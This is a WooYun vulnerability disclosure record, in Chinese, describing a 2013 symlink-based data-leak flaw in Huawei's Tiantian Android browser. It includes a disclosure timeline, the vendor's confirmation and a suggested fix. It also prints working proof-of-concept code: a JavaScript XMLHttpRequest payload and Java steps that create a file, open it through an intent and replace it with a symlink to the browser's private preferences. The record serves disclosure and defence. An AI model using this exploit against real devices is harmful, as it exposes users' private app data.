{"id": 6890, "wybug_id": "wooyun-2013-039246", "wybug_title": " 天天浏览器限制不严格导致信息泄露漏洞", "wybug_corp": "华为技术有限公司", "wybug_author": "一灯大师", "wybug_date": "2013-10-10 01:06", "wybug_open_date": "2014-01-08 01:07", "wybug_type": "用户敏感数据泄漏", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-10-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-10-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-10-15：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-12-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-12-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-12-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-01-08：\t细节向公众公开  简要描述： 天天浏览器限制不严格导致信息泄露漏洞 详细说明：  通过ln -s后，进而达到访问私有目录文件的主要利用代码简要如下:xhrContent代码如下:<body>    <u>Wait a few seconds.</u>    <script>        function doitjs() {            var xhr = new XMLHttpRequest;            xhr.onload = function () {                alert(xhr.responseText);            };            xhr.open('GET', document.URL);            xhr.send(null);        }        setTimeout(doitjs, 8000);    </script></body>  public void donow()    {        try        {            cmdexec(\"mkdir \" + \"/data/data/com.example.testtiantian/tmp/\");            cmdexec(\"echo \" + xhrContent + HTML_PATH);            cmdexec(\"chmod -R 777 \" + \"/data/data/com.example.testtiantian/tmp/\");            Thread.sleep(1000);            invokeNow(\"file://\" + HTML_PATH);            Thread.sleep(5000);            cmdexec(\"rm \" + HTML_PATH);            cmdexec(\"ln -s /data/data/com.tiantianmini.android.browser/shared_prefs/isFirst.xml \" + HTML_PATH);            return;        }        catch (Exception exception)        {            return;        }    }    public void invokeNow(String s)    {        Intent intent = new Intent(\"android.intent.action.VIEW\", Uri.parse(s));        intent.setClassName(\"com.tiantianmini.android.browser\", \"com.tiantianmini.android.browser.ui.browser.BrowserActivity\");        startActivity(intent);    }具体利用可参考刚公布出来的firefox此类漏洞的利用，详细url参看:https://viaforensics.com/mobile-security/chained-vulnerabilities-firefox-android-pimp-browser.html   漏洞证明：  显示效果如下，会读取私有目录的文件信息\n\n   修复方案：  对符号链接的文件要过滤判断，跟普通file域直接访问私有文件利用方式不一样   版权声明：转载请注明来源 一灯大师@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2013-10-12 14:10 厂商回复： 业务处理中，感谢白帽子关注。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-10-10 11:51 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1344 漏洞数:216        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  大师！快收了神通吧    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}